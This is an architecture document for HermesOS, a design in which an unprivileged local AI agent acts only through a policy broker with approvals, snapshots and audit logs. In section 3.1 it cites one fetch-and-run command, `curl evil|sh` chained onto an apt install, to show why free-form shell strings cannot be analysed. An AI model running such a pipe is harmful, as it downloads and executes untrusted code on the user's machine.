# HermesOS — Architecture

## 1. Layer cake

```
┌─────────────────────────────────────────────────────────┐
│  L5  HUMAN SURFACE                                      │
│      tty1 greeter · hermes-shell · local web UI (opt)   │
├─────────────────────────────────────────────────────────┤
│  L4  HERMES AGENT  (user: hermes, unprivileged)         │
│      upstream binary + SOUL.md + HermesOS skills        │
├─────────────────────────────────────────────────────────┤
│  L3  SAFETY BROKER   ← the only path downward           │
│      hermesctl (setuid-free, polkit/sudoers-scoped)     │
│      · policy engine  · approval gate                   │
│      · dry-run engine · audit writer                    │
├─────────────────────────────────────────────────────────┤
│  L2  SYSTEM SERVICES                                    │
│      ollama.service · snapshotd · hermes-gateway        │
├─────────────────────────────────────────────────────────┤
│  L1  UBUNTU SERVER 24.04 LTS                            │
│      systemd · apt · netplan · btrfs(/) + snapshots     │
└─────────────────────────────────────────────────────────┘
```

**The one architectural invariant:** L4 has *no* privileged capability of its
own. Hermes cannot call `sudo`. It can only ask L3 to perform one of a fixed,
enumerated set of verbs. If a verb isn't in the broker, Hermes physically
cannot do it — not "is told not to", *cannot*.

## 2. Users and privilege

| Unix user | Purpose | Privileges |
|---|---|---|
| `hermes` | Runs the agent | None. No sudo entry. Own home `/var/lib/hermes` |
| `hermes-broker` | Runs `hermesctl` privileged verbs | Narrow sudoers allowlist, one line per verb |
| the human (`you`) | The person | Full sudo, but never needs it day-to-day |

The human's account owns the machine. `hermes` is a guest with a very specific
job. This mapping is what makes the safety claims real rather than aspirational.

### sudoers shape (illustrative)
```
hermes ALL=(hermes-broker) NOPASSWD: /usr/lib/hermesos/hermesctl-exec
```
That is the *entire* privilege delegation. One binary, one hop. Everything
downstream of it is policy, written in Python, versioned in this repo, and
readable by the user with `hermes explain safety`.

## 3. Components

### 3.1 `hermesctl` — the safety broker
The heart of the safety model. A single CLI/daemon pair that:
- accepts a **structured request** (verb + typed args), never a raw string;
- resolves the request against the **policy engine** (allow / ask / deny);
- renders a **plain-English approval card** if the policy says ask;
- runs a **dry-run** first when the verb supports it;
- takes a **pre-flight snapshot** when the verb is snapshot-gated;
- executes, capturing stdout/stderr/exit;
- writes an **audit record** either way.

Requests are structured because free-form shell strings cannot be safely
analysed. `{"verb":"pkg.install","args":{"names":["vlc"]}}` is checkable.
`sudo apt install vlc && curl evil|sh` is not.

### 3.2 `snapshotd` — restore points
Thin wrapper over btrfs subvolume snapshots (preferred) or Timeshift (ext4
fallback). Exposes exactly four operations: `create`, `list`, `restore`,
`prune`. Auto-creates a snapshot before any snapshot-gated verb and keeps a
rolling window (default: last 10 auto + all manual).

### 3.3 `ollama.service`
Stock Ollama, bound to `127.0.0.1:11434`, no external listener. Model chosen
during first boot. Systemd hardening: `PrivateTmp`, `ProtectSystem=strict`,
`NoNewPrivileges`.

### 3.4 Hermes Agent
Upstream, installed via the official installer into `/opt/hermes`, run as the
`hermes` user by a systemd unit. HermesOS contributes only:
- `SOUL.md` (personality — see `05-soul.md`)
- a `hermesos` skill bundle (how to use the broker verbs)
- `config.yaml` pinned to `provider: ollama`, `approvals.mode: manual`
- the `hermesctl` tool registration

Never forked. `hermes update` continues to work.

### 3.5 `hermes-shell` — the login surface
The `you` user's login shell on tty1 is a tiny wrapper that:
1. prints the greeting,
2. execs `hermes` in chat mode,
3. on `!shell`, drops to bash with a one-line warning banner,
4. on exit from bash, returns to Hermes.

Not a locked shell — an *inviting* one. The escape hatch is always one word away.

## 4. Filesystem layout

```
/                      btrfs, subvol @        ← snapshotted
/home                  btrfs, subvol @home    ← snapshotted separately
/var/lib/hermes        hermes user home, agent state
/var/log/hermesos/     audit.jsonl, audit.txt (human-readable mirror)
/etc/hermesos/
  ├── policy.yaml      the capability + approval policy
  ├── verbs.d/         one file per broker verb
  └── branding/        greeting text, ASCII art
/usr/lib/hermesos/     hermesctl, snapshotd, translators
/opt/hermes/           upstream Hermes Agent
/var/lib/ollama/       models
```

Root on **btrfs** is a deliberate choice: snapshots are instant, copy-on-write,
and rollback is a subvolume swap rather than a file copy. This is what makes
"one-command undo" honest.

## 5. Boot flow

```
power on
  └─ GRUB (entries: HermesOS · HermesOS (previous restore point) · Recovery)
      └─ systemd
          ├─ ollama.service            (starts loading the model)
          ├─ hermesos-firstboot.service (only if /etc/hermesos/.setup-pending)
          │    └─ runs the wizard on tty1, then disables itself
          └─ getty@tty1 → login → hermes-shell → greeting → Hermes
```

The **"previous restore point"** GRUB entry is critical: if the agent ever does
break the system, recovery does not require a USB stick or a forum post. It
requires pressing a down-arrow at boot.

## 6. Network posture

- Ollama: localhost only.
- Hermes: no outbound calls unless the user enables an online provider.
- Gateway (Telegram etc.): **off** by default, opt-in during or after setup.
- apt: reaches Ubuntu mirrors, as normal, only when the user approves an update.

Default state after install: the machine can be unplugged from the internet and
everything still works.

## 7. Failure domains — what happens when X breaks

| Failure | Blast radius | Recovery |
|---|---|---|
| Model won't load | No conversation | Greeter falls back to a static menu + bash |
| Hermes crashes | No conversation | systemd restarts; `hermes-shell` offers bash |
| Broker denies wrongly | One action blocked | User overrides via `!shell` with sudo |
| Bad package install | System-level | `undo` → snapshot restore |
| Unbootable system | Total | GRUB "previous restore point" |
| Disk full | Degraded | snapshotd prunes; greeter warns early at 85% |

Every row has a recovery path that a beginner can execute. That is the bar.
